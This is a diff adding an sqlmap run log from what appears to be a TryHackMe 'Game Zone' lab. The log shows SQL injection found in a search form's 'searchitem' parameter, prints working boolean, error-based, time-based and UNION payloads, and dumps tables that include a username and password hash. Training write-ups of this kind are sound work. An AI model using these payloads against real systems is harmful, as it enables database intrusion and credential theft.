@@ -1,0 +1,117 @@
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.2.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 10:57:20
+
+[10:57:20] [INFO] parsing HTTP request from 'portal_search_request.txt'
+[10:57:20] [WARNING] using '/root/tryhackme/rooms/gamezone/assets/enum/sqlmap' as the output directory
+[10:57:20] [INFO] testing connection to the target URL
+[10:57:20] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[10:57:20] [INFO] testing if the target URL content is stable
+[10:57:21] [INFO] target URL content is stable
+[10:57:21] [INFO] testing if POST parameter 'searchitem' is dynamic
+[10:57:21] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
+[10:57:21] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
+[10:57:21] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
+[10:57:21] [INFO] testing for SQL injection on POST parameter 'searchitem'
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[10:57:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[10:57:21] [WARNING] reflective value(s) found and filtering out
+[10:57:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[10:57:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[10:57:21] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="be")
+[10:57:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[10:57:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[10:57:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[10:57:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[10:57:21] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[10:57:21] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[10:57:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[10:57:21] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[10:57:21] [INFO] POST parameter 'searchitem' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
+[10:57:21] [INFO] testing 'MySQL inline queries'
+[10:57:21] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
+[10:57:21] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[10:57:21] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
+[10:57:21] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
+[10:57:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[10:57:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[10:57:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[10:57:21] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
+[10:58:11] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 OR time-based blind' injectable 
+[10:58:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[10:58:12] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[10:58:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[10:58:12] [INFO] target URL appears to be UNION injectable with 3 columns
+[10:58:12] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+[10:58:12] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 121 HTTP(s) requests:
+---
+Parameter: searchitem (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: searchitem=-6049' OR 4174=4174#
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: searchitem=test' OR (SELECT 4447 FROM(SELECT COUNT(*),CONCAT(0x71626a6271,(SELECT (ELT(4447=4447,1))),0x7178766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- iqQP
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: searchitem=test' OR SLEEP(5)-- NCPM
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: searchitem=test' UNION ALL SELECT NULL,NULL,CONCAT(0x71626a6271,0x4c7a77425a4a6c786456674565546551437a694871414b416257454167574c6e4b78416e425a7267,0x7178766b71)#
+---
+[10:58:12] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.04 (xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0
+[10:58:12] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[10:58:12] [INFO] fetching current database
+[10:58:12] [INFO] fetching tables for database: 'db'
+[10:58:12] [INFO] fetching columns for table 'post' in database 'db'
+[10:58:12] [INFO] fetching entries for table 'post' in database 'db'
+Database: db
+Table: post
+[5 entries]
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | name                           | description                                                                                                                                                                                            |
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
+| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
+| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
+| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
+| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+[10:58:12] [INFO] table 'db.post' dumped to CSV file '/root/tryhackme/rooms/gamezone/assets/enum/sqlmap/10.10.17.37/dump/db/post.csv'
+[10:58:12] [INFO] fetching columns for table 'users' in database 'db'
+[10:58:12] [INFO] fetching entries for table 'users' in database 'db'
+[10:58:12] [INFO] recognized possible password hashes in column 'pwd'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[10:58:12] [INFO] using hash method 'sha256_generic_passwd'
+[10:58:12] [WARNING] no clear password(s) found
+Database: db
+Table: users
+[1 entry]
++------------------------------------------------------------------+----------+
+| pwd                                                              | username |
++------------------------------------------------------------------+----------+
+| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
++------------------------------------------------------------------+----------+
+
+[10:58:12] [INFO] table 'db.users' dumped to CSV file '/root/tryhackme/rooms/gamezone/assets/enum/sqlmap/10.10.17.37/dump/db/users.csv'
+[10:58:12] [INFO] fetched data logged to text files under '/root/tryhackme/rooms/gamezone/assets/enum/sqlmap/10.10.17.37'
+
+[*] shutting down at 10:58:12
+
